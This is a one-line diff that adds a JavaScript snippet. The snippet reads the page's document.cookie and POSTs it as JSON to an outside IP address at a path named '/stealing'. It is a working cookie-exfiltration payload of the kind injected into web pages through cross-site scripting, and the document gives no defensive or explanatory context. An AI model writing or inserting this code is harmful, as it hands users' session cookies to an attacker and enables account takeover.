@@ -1,0 +1,1 @@
+var keks = document.cookie;fetch(\'http://141.87.56.62:5000/stealing\',{\'method\':\'POST\',\'Content-Type\':\'application/json\',body:JSON.stringify({\'cookie\': keks})})
